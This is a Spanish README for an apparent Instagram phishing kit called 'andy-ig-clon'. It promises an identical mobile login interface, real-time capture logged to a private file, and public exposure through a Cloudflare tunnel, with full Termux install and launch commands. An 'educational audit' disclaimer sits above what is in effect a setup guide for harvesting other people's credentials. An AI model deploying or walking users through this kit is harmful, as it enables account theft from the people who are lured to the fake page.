# 🛡️ ANDY TECHNOLOGY - IG AUDIT TOOL v2.0

AVISO LEGAL Y REGLAS DE USO
===========================
Esta herramienta ha sido creada exclusivamente con fines EDUCATIVOS 
y de AUDITORÍA DE SEGURIDAD PERSONAL. 

1. USO RESPONSABLE: El autor no se hace responsable del mal uso.
2. ÉTICA: No usar en cuentas sin permiso explícito del dueño.
3. LEGALIDAD: El acceso no autorizado es ilegal. Úsalo bajo tu propio riesgo.

-----------------------------------------------------------

CARACTERÍSTICAS:
* Servidor Python Pro: Captura en tiempo real con banner ASCII.
* Interfaz Identica: Diseño optimizado para navegadores móviles.
* Auto-Log: Registro estructurado en 'registro_privado.txt'.
* Conexión: Optimizado para Termux y Cloudflare Tunnels.

-----------------------------------------------------------

INSTALACIÓN Y USO (Desde Cero)
==============================

PASO 1: Configuración inicial
-----------------------------
pkg update && pkg upgrade -y
pkg install python git cloudflared -y
git clone https://github.com/Andyromerook1/andy-ig-clon
cd andy-ig-clon

PASO 2: Iniciar Servidor (Pantalla 1)
-------------------------------------
python server.py

PASO 3: Crear el Túnel (Pantalla 2)
-----------------------------------
cloudflared tunnel --protocol http2 --url http://127.0.0.1:8080

-----------------------------------------------------------
Desarrollado por: ANDY TECHNOLOGY
"La seguridad es un proceso, no un producto."
-----------------------------------------------------------
